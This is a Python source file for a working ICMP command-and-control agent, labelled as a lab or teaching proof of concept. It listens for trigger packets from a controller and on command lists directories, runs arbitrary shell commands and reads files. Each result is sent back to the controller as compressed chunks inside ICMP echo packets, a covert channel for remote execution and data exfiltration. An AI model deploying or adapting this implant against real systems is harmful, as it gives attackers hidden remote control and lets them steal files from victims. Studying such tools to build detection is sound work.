#!/usr/bin/env python3
"""
agent.py — ICMP C2 agent (teaching / authorised-lab PoC).

Listens for CMD! triggers from the controller; replies with zlib-chunked
ICMP type-8 streams (START/CHUNK/END), RETRY, and ACK.
"""

from __future__ import annotations

import argparse
import os
import subprocess
import sys
import time
import zlib

from scapy.all import ICMP, IP, Raw, send, sniff

TRIGGER_MARKER = b"CMD!"
CHUNK_SIZE = 36

INTERFACE = ""
C2_SERVER_IP = ""

active_stream_name = ""
cached_chunks_matrix: dict = {}
busy = False


def transmit_chunk(data_bytes: bytes, sequence_number: int) -> None:
    pkt = (
        IP(dst=C2_SERVER_IP)
        / ICMP(type=8, id=0xC200, seq=sequence_number)
        / Raw(load=TRIGGER_MARKER + data_bytes)
    )
    send(pkt, iface=INTERFACE, verbose=False)
    time.sleep(0.01)


def optimize_and_stream(stream_name: str, raw_data_bytes: bytes) -> None:
    global active_stream_name, cached_chunks_matrix, busy
    busy = True
    active_stream_name = stream_name
    cached_chunks_matrix = {}

    compressed = zlib.compress(raw_data_bytes)

    seq = 0
    for i in range(0, len(compressed), CHUNK_SIZE):
        cached_chunks_matrix[seq] = compressed[i : i + CHUNK_SIZE]
        seq += 1

    start = TRIGGER_MARKER + f"[START]{seq}|{stream_name}".encode()
    send(
        IP(dst=C2_SERVER_IP) / ICMP(type=8, id=0xC200) / Raw(load=start),
        iface=INTERFACE,
        verbose=False,
    )
    time.sleep(0.05)

    for seq_id in range(seq):
        transmit_chunk(b"[CHUNK]" + cached_chunks_matrix[seq_id], seq_id)

    time.sleep(0.05)
    end = TRIGGER_MARKER + b"[END]" + stream_name.encode()
    send(
        IP(dst=C2_SERVER_IP) / ICMP(type=8, id=0xC200) / Raw(load=end),
        iface=INTERFACE,
        verbose=False,
    )


def parse_trigger(packet) -> None:
    global CHUNK_SIZE, cached_chunks_matrix, active_stream_name, busy

    if not packet.haslayer(IP) or not packet.haslayer(Raw):
        return
    if packet[IP].src != C2_SERVER_IP:
        return

    raw_payload = packet[Raw].load
    if TRIGGER_MARKER not in raw_payload:
        return

    idx = raw_payload.find(TRIGGER_MARKER)
    cmd_payload = raw_payload[idx + len(TRIGGER_MARKER) :].decode("utf-8", errors="ignore")

    if "|" not in cmd_payload:
        return

    action, argument = cmd_payload.split("|", 1)

    if action == "SIZE":
        try:
            CHUNK_SIZE = max(12, int(argument) - 28)
        except ValueError:
            pass
        return

    if action == "RETRY":
        try:
            missing_list = [int(x) for x in argument.split(",") if x != ""]
        except ValueError:
            return
        for seq_id in missing_list:
            if seq_id in cached_chunks_matrix:
                transmit_chunk(b"[CHUNK]" + cached_chunks_matrix[seq_id], seq_id)
        time.sleep(0.05)
        end = TRIGGER_MARKER + b"[END]" + active_stream_name.encode()
        send(
            IP(dst=C2_SERVER_IP) / ICMP(type=8, id=0xC200) / Raw(load=end),
            iface=INTERFACE,
            verbose=False,
        )
        return

    if action == "ACK":
        cached_chunks_matrix, active_stream_name = {}, ""
        busy = False
        return

    if busy and action in ("LS", "RUN", "SEND"):
        return

    if action == "LS":
        try:
            listing = "\n".join(os.listdir(argument or ".")).encode()
            optimize_and_stream("ls_output.txt", listing)
        except Exception as e:
            optimize_and_stream("ls_output.txt", str(e).encode())

    elif action == "RUN":
        try:
            res = subprocess.run(argument, shell=True, capture_output=True)
            output = res.stdout + res.stderr
            if not output:
                output = b"Empty command log output."
            optimize_and_stream("command_log.txt", output)
        except Exception as e:
            optimize_and_stream("command_log.txt", str(e).encode())

    elif action == "SEND":
        if not os.path.isfile(argument):
            optimize_and_stream(
                "command_log.txt",
                f"SEND failed: not a file: {argument!r}".encode(),
            )
            return
        try:
            filename = os.path.basename(argument)
            with open(argument, "rb") as f:
                contents = f.read()
            optimize_and_stream(filename, contents)
        except Exception as e:
            optimize_and_stream("command_log.txt", str(e).encode())


def parse_args():
    ap = argparse.ArgumentParser(
        description="ICMP C2 agent — authorised lab / coursework only."
    )
    ap.add_argument(
        "--server",
        default=os.environ.get("ICMP_C2_SERVER"),
        help="Controller IP (or env ICMP_C2_SERVER)",
    )
    ap.add_argument(
        "--iface",
        default=os.environ.get("ICMP_C2_IFACE"),
        help="Sniff/send interface, e.g. eth0 or ens5 (or env ICMP_C2_IFACE)",
    )
    return ap.parse_args()


def main() -> None:
    global INTERFACE, C2_SERVER_IP

    if os.geteuid() != 0:
        sys.exit("[-] Needs root (sudo).")

    args = parse_args()
    if not args.server or not args.iface:
        sys.exit(
            "[-] Set --server and --iface (or ICMP_C2_SERVER / ICMP_C2_IFACE). "
            "No baked-in lab defaults."
        )
    C2_SERVER_IP = args.server
    INTERFACE = args.iface

    print(f"[*] Agent online on {INTERFACE}; C2={C2_SERVER_IP}. Sniffing ICMP...")
    sniff(iface=INTERFACE, filter="icmp", prn=parse_trigger, store=0)


if __name__ == "__main__":
    main()
